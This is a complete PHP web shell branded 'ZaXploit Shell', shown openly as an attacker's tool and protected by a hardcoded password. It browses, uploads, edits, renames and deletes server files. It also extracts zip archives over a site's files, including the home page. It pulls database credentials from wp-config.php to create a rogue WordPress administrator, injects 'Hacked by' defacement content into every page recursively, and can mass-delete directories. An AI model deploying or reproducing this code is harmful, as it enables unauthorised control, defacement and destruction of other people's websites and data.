<?php
session_start();
$pass="Zaa123";
$hackername = "malz";

if(!isset($_SESSION["login"])){
    if(isset($_POST["p"])&&$_POST["p"]===$pass){$_SESSION["login"]=1;header("Location:?");exit;}
    echo '<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Login</title></head>
    <body style="margin:0;background:#000;color:#fff;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh">
    <img src="https://files.catbox.moe/g8lklo.jpg" alt="./EzXH4x0r" style="width:300px"><div>
    <form method="post" style="text-align:center"><input type="password" name="p" placeholder="Password" style="padding:10px;border:none;border-radius:5px;background:#111;color:#0f0">
    <button style="padding:10px 15px;margin-left:5px;border:none;border-radius:5px;background:#0f0;color:#000">Login</button></form></div></body></html>';
    exit;
}

$path = isset($_GET["d"]) ? realpath($_GET["d"]) : getcwd();
if(!$path) $path = getcwd();

if(isset($_GET["logout"])){session_destroy();header("Location:?");exit;}
if(isset($_GET["del"])){@unlink($_GET["del"]);header("Location:?d=".urlencode($path));exit;}
if(isset($_POST["newfolder"])){@mkdir($path."/".$_POST["newfolder"]);header("Location:?d=".urlencode($path));exit;}
if(isset($_POST["upload"])){
    $tmp=$_FILES["file"]["tmp_name"];
    $name=basename($_FILES["file"]["name"]);
    $target=$path."/".$name;
    if(is_uploaded_file($tmp)){move_uploaded_file($tmp,$target);}
    header("Location:?d=".urlencode($path));exit;
}
if(isset($_POST["editfile"])){file_put_contents($_POST["file"],$_POST["content"]);header("Location:?d=".urlencode($path));exit;}
if(isset($_GET["r"])){rename($_GET["r"],dirname($_GET["r"])."/".$_GET["new"]);header("Location:?d=".urlencode($path));exit;}

// ========== UPLOAD ZIP & EXTRACT ==========
if(isset($_POST["upload_zip"])){
    $tmp = $_FILES["zip_file"]["tmp_name"];
    $name = basename($_FILES["zip_file"]["name"]);
    $target = $path."/".$name;
    
    if(is_uploaded_file($tmp)){
        move_uploaded_file($tmp, $target);
        
        $zip = new ZipArchive;
        if($zip->open($target) === TRUE){
            $zip->extractTo($path);
            $zip->close();
            unlink($target);
            $msg = "Zip extracted successfully to " . $path;
        } else {
            $msg = "Failed to extract zip file";
        }
    } else {
        $msg = "Upload failed";
    }
    header("Location:?d=".urlencode($path)."&msg=".urlencode($msg));
    exit;
}

// ========== UPLOAD ZIP & REPLACE HOME PAGE ==========
if(isset($_POST["upload_zip_replace"])){
    $tmp = $_FILES["zip_replace"]["tmp_name"];
    $name = basename($_FILES["zip_replace"]["name"]);
    $target = $path."/".$name;
    $replaced = false;
    
    if(is_uploaded_file($tmp)){
        move_uploaded_file($tmp, $target);
        
        $zip = new ZipArchive;
        if($zip->open($target) === TRUE){
            for($i = 0; $i < $zip->numFiles; $i++){
                $filename = $zip->getNameIndex($i);
                $basename = strtolower(basename($filename));
                
                if($basename == 'index.html' || $basename == 'index.php' || $basename == 'index.htm'){
                    $content = $zip->getFromIndex($i);
                    file_put_contents($path."/".$filename, $content);
                    $replaced = true;
                    break;
                }
            }
            $zip->close();
            unlink($target);
            
            if($replaced){
                $msg = "Home page replaced successfully with " . $filename;
            } else {
                $msg = "No index.html or index.php found in zip file";
            }
        } else {
            $msg = "Failed to extract zip file";
        }
    } else {
        $msg = "Upload failed";
    }
    header("Location:?d=".urlencode($path)."&msg=".urlencode($msg));
    exit;
}

// ========== UPLOAD ZIP & REPLACE ALL FILES ==========
if(isset($_POST["upload_zip_force"])){
    $tmp = $_FILES["zip_force"]["tmp_name"];
    $name = basename($_FILES["zip_force"]["name"]);
    $target = $path."/".$name;
    $fileCount = 0;
    
    if(is_uploaded_file($tmp)){
        move_uploaded_file($tmp, $target);
        
        $zip = new ZipArchive;
        if($zip->open($target) === TRUE){
            for($i = 0; $i < $zip->numFiles; $i++){
                $filename = $zip->getNameIndex($i);
                if(substr($filename, -1) != '/'){
                    $content = $zip->getFromIndex($i);
                    file_put_contents($path."/".$filename, $content);
                    $fileCount++;
                }
            }
            $zip->close();
            unlink($target);
            $msg = "All files replaced! (" . $fileCount . " files extracted)";
        } else {
            $msg = "Failed to extract zip file";
        }
    } else {
        $msg = "Upload failed";
    }
    header("Location:?d=".urlencode($path)."&msg=".urlencode($msg));
    exit;
}

// ========== WP-ADMIN CREATOR ==========
function wp_hash_password($password) {
    return password_hash($password, PASSWORD_BCRYPT);
}
function find_wp_config($start_dir) {
    $dir = realpath($start_dir);
    while ($dir != '/' && $dir != '') {
        if(file_exists($dir.'/wp-config.php')) return $dir.'/wp-config.php';
        $dir = dirname($dir);
    }
    return false;
}
function current_time($type) { return date('Y-m-d H:i:s'); }

if(isset($_POST["create_wp_admin"])) {
    $wp_user = $_POST["wp_user"] ?: 'malz';
    $wp_pass = $_POST["wp_pass"] ?: 'Zaa123';
    $wp_email = $_POST["wp_email"] ?: $wp_user.'@hacker.local';
    $config_path = find_wp_config($path);
    
    if($config_path) {
        $config_content = file_get_contents($config_path);
        preg_match("/define\(\s*'DB_NAME'\s*,\s*'([^']+)'\s*\)/", $config_content, $db_name);
        preg_match("/define\(\s*'DB_USER'\s*,\s*'([^']+)'\s*\)/", $config_content, $db_user);
        preg_match("/define\(\s*'DB_PASSWORD'\s*,\s*'([^']+)'\s*\)/", $config_content, $db_pass);
        preg_match("/define\(\s*'DB_HOST'\s*,\s*'([^']+)'\s*\)/", $config_content, $db_host);
        preg_match("/\$table_prefix\s*=\s*'([^']+)'/", $config_content, $prefix);
        
        $db_name = $db_name[1] ?? ''; $db_user = $db_user[1] ?? ''; $db_pass = $db_pass[1] ?? '';
        $db_host = $db_host[1] ?? 'localhost'; $prefix = $prefix[1] ?? 'wp_';
        
        if($db_name && $db_user) {
            $wpdb = new mysqli($db_host, $db_user, $db_pass, $db_name);
            if(!$wpdb->connect_error) {
                $hash = wp_hash_password($wp_pass);
                $user_nicename = strtolower(str_replace(' ', '-', $wp_user));
                $now = current_time('mysql');
                $check = $wpdb->query("SELECT ID FROM {$prefix}users WHERE user_login = '$wp_user'");
                if($check == 0) {
                    $insert = $wpdb->query("INSERT INTO {$prefix}users (user_login, user_pass, user_nicename, user_email, user_registered, display_name) VALUES ('$wp_user', '$hash', '$user_nicename', '$wp_email', '$now', '$wp_user')");
                    if($insert) {
                        $user_id = $wpdb->insert_id;
                        $wpdb->query("INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) VALUES ('$user_id', '{$prefix}capabilities', 'a:1:{s:13:\"administrator\";b:1;}'), ('$user_id', '{$prefix}user_level', '10')");
                        $msg = "WP-Admin created: $wp_user / $wp_pass";
                    } else $msg = "Insert failed";
                } else $msg = "Username already exists";
                $wpdb->close();
            } else $msg = "DB connection failed";
        } else $msg = "DB credentials not found";
    } else $msg = "wp-config.php not found";
    header("Location:?d=".urlencode($path)."&msg=".urlencode($msg)); exit;
}

// ========== DEFACER TOOLS ==========
if(isset($_POST["deface_single_file"])){
    $target_file = $_POST["target_file"];
    $source_code = $_POST["source_code"];
    if(!empty($target_file) && !empty($source_code)){
        file_put_contents($target_file, $source_code);
        $msg = "Defaced: $target_file";
    } else $msg = "File name or source code empty";
    header("Location:?d=".urlencode($path)."&msg=".urlencode($msg)); exit;
}

if(isset($_POST["deface_single_dir"])){
    $dir = $path;
    $filename = $_POST["filename"] ?: 'index.html';
    $source_code = $_POST["source_code"];
    if(!empty($source_code)){
        file_put_contents($dir."/".$filename, $source_code);
        $msg = "Defaced: $dir/$filename";
    } else $msg = "Source code empty";
    header("Location:?d=".urlencode($path)."&msg=".urlencode($msg)); exit;
}

if(isset($_POST["deface_all_dir"])){
    $filename = $_POST["filename"] ?: 'index.html';
    $source_code = $_POST["source_code"];
    $count = 0;
    if(!empty($source_code)){
        $dirs = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path), RecursiveIteratorIterator::SELF_FIRST);
        foreach($dirs as $dir){
            if($dir->isDir()){
                @file_put_contents($dir->getPathname()."/".$filename, $source_code);
                $count++;
            }
        }
        $msg = "Defaced $count directories with $filename";
    } else $msg = "Source code empty";
    header("Location:?d=".urlencode($path)."&msg=".urlencode($msg)); exit;
}

// ========== MASS DEFACE MODULES ==========
$deface_html = '<!DOCTYPE html><html><head><title>Hacked by '.$hackername.'</title><style>body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding:50px}.glitch{font-size:48px;text-shadow:0 0 10px #0f0}</style></head><body><div class="glitch">HACKED BY '.$hackername.'</div><div>ZaXploit Shell</div></body></html>';

if(isset($_GET["deface_single"])){
    $injected = 0;
    if(file_put_contents($path."/index.html", $deface_html)) $injected++;
    if(file_put_contents($path."/index.php", "<?php header('Location: index.html'); ?>")) $injected++;
    if(file_put_contents($path."/.htaccess", "DirectoryIndex index.html index.php\nRewriteEngine On\nRewriteRule ^$ index.html [L]")) $injected++;
    header("Location:?d=".urlencode($path)."&msg=Deface_Single_OK:$injected"); exit;
}

if(isset($_GET["deface_all"])){
    $count = 0;
    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path));
    foreach($files as $file){
        if($file->isFile()){
            $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
            if(in_array($ext, ['php','html','htm','js','txt','phtml','shtml'])){
                $content = file_get_contents($file);
                if(strpos($content, 'HACKED BY '.$hackername) === false){
                    $inject = $ext == 'php' ? "\n<?php echo '<!-- Hacked by $hackername -->'; ?>\n" : "\n<!-- Hacked by $hackername -->\n";
                    file_put_contents($file, $inject, FILE_APPEND);
                    $count++;
                }
            }
        }
    }
    header("Location:?d=".urlencode($path)."&msg=Deface_All_OK:$count"); exit;
}

if(isset($_GET["mass_delete"])){
    $count = 0; $self = basename(__FILE__);
    $files = scandir($path);
    foreach($files as $f){
        if($f == '.' || $f == '..' || $f == $self) continue;
        $fp = $path."/".$f;
        is_dir($fp) ? deleteDirectory($fp) : @unlink($fp);
        $count++;
    }
    header("Location:?d=".urlencode($path)."&msg=Mass_Delete_OK:$count"); exit;
}

if(isset($_GET["fix_zerobyte"])){
    $count = 0;
    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path));
    foreach($files as $file){
        if($file->isFile() && filesize($file) == 0){
            $ext = pathinfo($file, PATHINFO_EXTENSION);
            $default = '';
            if($ext == 'php') $default = "<?php\n// Fixed\n?>";
            elseif($ext == 'html' || $ext == 'htm') $default = "<!-- Fixed -->\n";
            elseif($ext == 'js') $default = "// Fixed\n";
            elseif($ext == 'txt') $default = "Fixed\n";
            file_put_contents($file, $default);
            $count++;
        }
    }
    header("Location:?d=".urlencode($path)."&msg=Fix_ZeroByte_OK:$count"); exit;
}

if(isset($_GET["scan_zerobyte"])){
    $zerofiles = [];
    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path));
    foreach($files as $file){
        if($file->isFile() && filesize($file) == 0) $zerofiles[] = $file->getPathname();
    }
    $msg = "ZeroByte_Scan:" . count($zerofiles) . ":" . implode("|", array_slice($zerofiles,0,20));
    header("Location:?d=".urlencode($path)."&msg=".urlencode($msg)); exit;
}

function deleteDirectory($dir) {
    if(!is_dir($dir)) return;
    $files = array_diff(scandir($dir), array('.','..'));
    foreach($files as $file){
        $fp = "$dir/$file";
        is_dir($fp) ? deleteDirectory($fp) : @unlink($fp);
    }
    @rmdir($dir);
}

// ========== UI SHELL ==========
echo '<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>ZaXploit Shell - '.$hackername.'</title>
<style>
body{margin:0;background:#000;color:#fff;font-family:monospace}
.header{background:#111;padding:10px;position:sticky;top:0;display:flex;justify-content:space-between;align-items:center}
a{color:#0f0;text-decoration:none;word-break:break-all}
.btn{background:#0f0;color:#000;border:none;padding:7px 12px;border-radius:5px;cursor:pointer}
.btn:hover{background:#0f0;color:#000;opacity:0.8}
input,textarea,select{background:#111;color:#0f0;border:none;padding:8px;border-radius:5px;width:100%;box-sizing:border-box}
.card{background:#111;margin:10px 0;padding:15px;border-radius:8px}
table{width:100%;border-collapse:collapse}
td{padding:8px;border-bottom:1px solid #222;word-break:break-all}
form.inline{display:inline}
.msg{background:#0f0;color:#000;padding:10px;margin:10px 0;border-radius:5px;font-weight:bold}
</style></head><body>';

if(isset($_GET["msg"])){
    echo '<div class="msg">'.htmlspecialchars($_GET["msg"]).'</div>';
}

echo '<div class="header"><div><span style="color:#0f0;font-weight:900">ZaXploit</span> | Dir: '.htmlspecialchars($path).'</div><a href="?logout=1" style="color:#f33">Logout</a></div>';
echo '<div style="padding:10px">';

// Upload & Create Folder
echo '<div class="card">';
echo '<div style="color:#0f0;font-weight:bold;margin-bottom:10px">[ FILE UPLOAD & FOLDER ]</div>';
echo '<form method="post" enctype="multipart/form-data" style="display:flex;gap:5px;flex-wrap:wrap;margin-bottom:10px">
<input type="file" name="file" style="flex:1"><button name="upload" class="btn">Upload</button></form>';
echo '<form method="post" style="display:flex;gap:5px">
<input name="newfolder" placeholder="New Folder" style="flex:1"><button class="btn">Create Folder</button></form>';
echo '</div>';

// ========== ZIP MANAGER ==========
echo '<div class="card">';
echo '<div style="color:#0f0;font-weight:bold;margin-bottom:10px">[ ZIP MANAGER ]</div>';

echo '<form method="post" enctype="multipart/form-data" style="margin-bottom:10px">
<input type="file" name="zip_file" accept=".zip" style="margin-bottom:5px">
<button type="submit" name="upload_zip" class="btn">📦 Extract Zip (Keep Structure)</button>
</form>';

echo '<form method="post" enctype="multipart/form-data" style="margin-bottom:10px">
<input type="file" name="zip_replace" accept=".zip" style="margin-bottom:5px">
<button type="submit" name="upload_zip_replace" class="btn">🏠 Extract & Replace Home Page (index)</button>
</form>';

echo '<form method="post" enctype="multipart/form-data">
<input type="file" name="zip_force" accept=".zip" style="margin-bottom:5px">
<button type="submit" name="upload_zip_force" class="btn">💣 Extract & Replace ALL Files</button>
</form>';
echo '</div>';

// ========== WP-ADMIN CREATOR ==========
echo '<div class="card">';
echo '<div style="color:#0f0;font-weight:bold;margin-bottom:10px">[ WP-ADMIN CREATOR ]</div>';
echo '<form method="post" style="display:flex;flex-wrap:wrap;gap:5px">';
echo '<input type="text" name="wp_user" placeholder="Username" value="malz" style="flex:1">';
echo '<input type="password" name="wp_pass" placeholder="Password" value="Zaa123" style="flex:1">';
echo '<input type="email" name="wp_email" placeholder="Email" value="malz@hacker.local" style="flex:1">';
echo '<button type="submit" name="create_wp_admin" class="btn" style="width:100%">[ CREATE WP-ADMIN ]</button>';
echo '</form></div>';

// ========== DEFACER TOOLS ==========
echo '<div class="card">';
echo '<div style="color:#0f0;font-weight:bold;margin-bottom:10px">[ DEFACER TOOLS ]</div>';

// Deface Single File
echo '<form method="post" style="margin-bottom:15px">';
echo '<div style="color:#0f0;margin-bottom:5px">› Deface Single File</div>';
echo '<input type="text" name="target_file" placeholder="Full path to file" style="margin-bottom:5px">';
echo '<textarea name="source_code" placeholder="Source code here..." style="height:120px;margin-bottom:5px"></textarea>';
echo '<button type="submit" name="deface_single_file" class="btn" style="width:100%">[ DEFACE SINGLE FILE ]</button>';
echo '</form>';

// Deface Single Directory
echo '<form method="post" style="margin-bottom:15px">';
echo '<div style="color:#0f0;margin-bottom:5px">› Deface Current Directory</div>';
echo '<input type="text" name="filename" placeholder="Filename (e.g. index.html)" value="index.html" style="margin-bottom:5px">';
echo '<textarea name="source_code" placeholder="Source code here..." style="height:120px;margin-bottom:5px"></textarea>';
echo '<button type="submit" name="deface_single_dir" class="btn" style="width:100%">[ DEFACE THIS DIR ]</button>';
echo '</form>';

// Deface All Directories
echo '<form method="post">';
echo '<div style="color:#0f0;margin-bottom:5px">› Deface All Directories (recursive)</div>';
echo '<input type="text" name="filename" placeholder="Filename (e.g. index.html)" value="index.html" style="margin-bottom:5px">';
echo '<textarea name="source_code" placeholder="Source code here..." style="height:120px;margin-bottom:5px"></textarea>';
echo '<button type="submit" name="deface_all_dir" class="btn" style="width:100%">[ DEFACE ALL DIR ]</button>';
echo '</form>';
echo '</div>';

// ========== MASS DEFACE TOOLS ==========
echo '<div class="card">';
echo '<div style="color:#0f0;font-weight:bold;margin-bottom:10px">[ MASS DEFACE TOOLS ]</div>';
echo '<div style="display:flex;gap:5px;flex-wrap:wrap">';
echo '<a href="?d='.urlencode($path).'&deface_single=1" class="btn">DEFACE SINGLE DIR (AUTO)</a>';
echo '<a href="?d='.urlencode($path).'&deface_all=1" class="btn">DEFACE ALL FILES</a>';
echo '<a href="?d='.urlencode($path).'&mass_delete=1" class="btn" onclick="return confirm(\'Mass delete?\')">MASS DELETE</a>';
echo '<a href="?d='.urlencode($path).'&fix_zerobyte=1" class="btn">ANTI 0KB</a>';
echo '<a href="?d='.urlencode($path).'&scan_zerobyte=1" class="btn">SCAN 0KB</a>';
echo '</div></div>';

// EDITOR
if(isset($_GET["edit"])){
    $f = $_GET["edit"];
    $content = htmlspecialchars(file_get_contents($f));
    echo '<form method="post" class="card"><input type="hidden" name="file" value="'.htmlspecialchars($f).'">';
    echo '<div style="color:#0f0;margin-bottom:5px">Editing: '.htmlspecialchars($f).'</div>';
    echo '<textarea name="content" style="height:70vh">'.$content.'</textarea>';
    echo '<button name="editfile" class="btn" style="margin-top:5px;width:100%">Save</button>';
    echo '</form></div></body></html>';
    exit;
}

// FILE LIST
echo '<div class="card">';
echo '<div style="color:#0f0;font-weight:bold;margin-bottom:10px">[ FILE MANAGER ]</div>';
echo '<table>';
if($path != "/") echo '<tr><td><a href="?d='.urlencode(dirname($path)).'">[ .. ] Back to Parent</a></td><td></td></tr>';
$files = scandir($path);
foreach($files as $f){
    if($f == "." || $f == "..") continue;
    $fp = $path."/".$f;
    $is_dir = is_dir($fp);
    echo '<tr>';
    echo '<td>';
    if($is_dir){
        echo '<a href="?d='.urlencode($fp).'">📁 '.$f.'/</a>';
    } else {
        $size = filesize($fp);
        $size_display = $size < 1024 ? $size . ' B' : ($size < 1048576 ? round($size/1024,1) . ' KB' : round($size/1048576,1) . ' MB');
        echo '<a href="?d='.urlencode($path).'&edit='.urlencode($fp).'">📄 '.$f.'</a> <span style="color:#666;font-size:10px">('.$size_display.')</span>';
        if(filesize($fp) == 0) echo ' <span style="color:#f33">[0KB]</span>';
    }
    echo '</td>';
    echo '<td style="text-align:right">';
    if(!$is_dir){
        echo '<a href="?d='.urlencode($path).'&del='.urlencode($fp).'" style="color:#f33;margin-right:10px" onclick="return confirm(\'Delete?\')">🗑️ Delete</a>';
        echo '<form class="inline" method="get" style="display:inline">';
        echo '<input type="hidden" name="d" value="'.htmlspecialchars($path).'">';
        echo '<input type="hidden" name="r" value="'.htmlspecialchars($fp).'">';
        echo '<input name="new" placeholder="rename" style="width:100px;background:#222;color:#0f0;border:none;padding:5px;border-radius:3px">';
        echo '<button class="btn" style="padding:5px 8px">✏️</button>';
        echo '</form>';
    }
    echo '</td>';
    echo '</tr>';
}
echo '</table></div>';

echo '<div class="card" style="text-align:center;color:#0f0">';
echo 'Hacked by <strong>'.$hackername.'</strong> | ZaXploit Shell | Full Defacer + WP-Admin + Zip Manager';
echo '</div>';

echo '</div></body></html>';
?>